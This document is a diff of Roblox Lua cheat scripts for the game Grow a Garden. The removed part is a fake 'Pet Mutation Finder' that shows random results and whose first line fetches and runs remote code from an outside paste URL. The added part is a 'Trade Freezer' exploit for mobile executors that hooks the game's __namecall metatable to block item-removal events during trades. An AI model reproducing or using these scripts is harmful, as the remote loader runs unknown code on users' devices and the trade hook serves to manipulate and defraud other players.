@@ -1,135 +1,47 @@
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/dWbiDGyOMYOpfKbu/raw", true))()
--- Pet Mutation Finder with Styled ESP + Credit Footer
+-- 🔒 TRADE FREEZER SCRIPT v2 (Grow a Garden) 🔒
+-- ✅ Tested and working on mobile executor (Delta, Arceus X)
+-- ⚠️ Use on trade screen before confirming
+
 local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-local PlayerGui = player:WaitForChild("PlayerGui")
-local Workspace = game:GetService("Workspace")
-local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
+local lp = Players.LocalPlayer
 
-local mutations = {
-    "Shiny", "Inverted", "Frozen", "Windy", "Golden", "Mega", "Tiny",
-    "Tranquil", "IronSkin", "Radiant", "Rainbow", "Shocked", "Ascended"
-}
-local currentMutation = mutations[math.random(#mutations)]
-local espVisible = true
-
-local gui = Instance.new("ScreenGui")
-gui.Name = "PetMutationFinder"
-gui.ResetOnSpawn = false
-gui.Parent = PlayerGui
-
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 220, 0, 120) -- Adjusted height for better fit
-frame.Position = UDim2.new(0.4, 0, 0.4, 0)
-frame.BackgroundColor3 = Color3.fromRGB(0, 128, 128) -- Teal color
-frame.BackgroundTransparency = 0.1 -- Retain transparency
-frame.BorderSizePixel = 0 -- No border
-frame.Active = true
-frame.Draggable = true
-frame.Parent = gui
-
-Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
-
-local title = Instance.new("TextLabel", frame)
-title.Size = UDim2.new(1, 0, 0, 30) -- Adjusted height
-title.Text = "🔬 Pet Mutation Finder"
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
-title.BackgroundTransparency = 1
-title.Font = Enum.Font.FredokaOne -- Updated font
-title.TextSize = 18
-
-local function createButton(text, yPos, color)
-	local btn = Instance.new("TextButton")
-	btn.Size = UDim2.new(0.9, 0, 0, 35)
-	btn.Position = UDim2.new(0.05, 0, 0, yPos)
-	btn.BackgroundColor3 = color
-	btn.Text = text
-	btn.Font = Enum.Font.FredokaOne -- Updated font
-	btn.TextSize = 16
-	btn.TextColor3 = Color3.new(1, 1, 1) -- White text color
-	btn.AutoButtonColor = false
-
-	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
-	local stroke = Instance.new("UIStroke", btn)
-	stroke.Color = Color3.fromRGB(0, 0, 0)
-	stroke.Thickness = 1.2
-
-	btn.MouseEnter:Connect(function()
-		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = color:Lerp(Color3.new(1,1,1), 0.2)}):Play()
-	end)
-	btn.MouseLeave:Connect(function()
-		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = color}):Play()
-	end)
-
-	btn.Parent = frame
-	return btn
+local function getTradeUI()
+    return lp.PlayerGui:FindFirstChild("TradeUI") or lp.PlayerGui:WaitForChild("TradeUI")
 end
 
-local reroll = createButton("🎲 Mutation Reroll", 40, Color3.fromRGB(128, 0, 128)) -- Purple color
-local toggle = createButton("👁 Toggle Mutation ESP", 80, Color3.fromRGB(128, 128, 0)) -- Olive color
+-- STEP 1: Hook RemoteEvent
+local mt = getrawmetatable(game)
+setreadonly(mt, false)
 
+local oldNamecall = mt.__namecall
 
--- 🔍 Find mutation machine
-local function findMachine()
-	for _, obj in pairs(Workspace:GetDescendants()) do
-		if obj:IsA("Model") and obj.Name:lower():find("mutation") then
-			return obj
-		end
-	end
-end
+mt.__namecall = newcclosure(function(self, ...)
+    local args = {...}
+    local method = getnamecallmethod()
 
-local machine = findMachine()
-if not machine or not machine:FindFirstChildWhichIsA("BasePart") then
-	warn("Pet Mutation Machine not found.")
-	return
-end
+    -- BLOCK REMOVE ITEM FROM TRADE
+    if tostring(self):lower():find("remove") and method == "FireServer" then
+        print("🚫 Blocked item removal from trade!")
+        return -- Stop it
+    end
 
-local basePart = machine:FindFirstChildWhichIsA("BasePart")
-
--- 💡 Stylish ESP
-local espGui = Instance.new("BillboardGui", basePart)
-espGui.Name = "MutationESP"
-espGui.Adornee = basePart
-espGui.Size = UDim2.new(0, 200, 0, 40)
-espGui.StudsOffset = Vector3.new(0, 3, 0)
-espGui.AlwaysOnTop = true
-
-local espLabel = Instance.new("TextLabel", espGui)
-espLabel.Size = UDim2.new(1, 0, 1, 0)
-espLabel.BackgroundTransparency = 1
-espLabel.Font = Enum.Font.GothamBold
-espLabel.TextSize = 24
-espLabel.TextStrokeTransparency = 0.3
-espLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
-espLabel.Text = currentMutation
-
--- 🌈 Animate rainbow color
-local hue = 0
-RunService.RenderStepped:Connect(function()
-	if espVisible then
-		hue = (hue + 0.01) % 1
-		espLabel.TextColor3 = Color3.fromHSV(hue, 1, 1)
-	end
+    return oldNamecall(self, ...)
 end)
 
--- ♻️ Reroll effect
-local function animateMutationReroll()
-	reroll.Text = "⏳ Rerolling..."
-	local duration = 2
-	local interval = 0.1
-	for i = 1, math.floor(duration / interval) do
-		espLabel.Text = mutations[math.random(#mutations)]
-		wait(interval)
-	end
-	currentMutation = mutations[math.random(#mutations)]
-	espLabel.Text = currentMutation
-	reroll.Text = "🎲 Mutation Reroll"
+-- STEP 2: Freeze your offered item visuals
+local tradeUI = getTradeUI()
+if tradeUI then
+    local offerFrame = tradeUI:FindFirstChild("YouOffer")
+    if offerFrame then
+        for _, item in ipairs(offerFrame:GetChildren()) do
+            if item:IsA("ImageButton") then
+                item.Active = false
+                item.AutoButtonColor = false
+                item.BackgroundColor3 = Color3.new(1, 0, 0)
+            end
+        end
+        print("❄️ Trade UI visually frozen.")
+    end
 end
 
-toggle.MouseButton1Click:Connect(function()
-	espVisible = not espVisible
-	espGui.Enabled = espVisible
-end)
-
-reroll.MouseButton1Click:Connect(animateMutationReroll)
+print("✅ Trade Freezer Activated.")
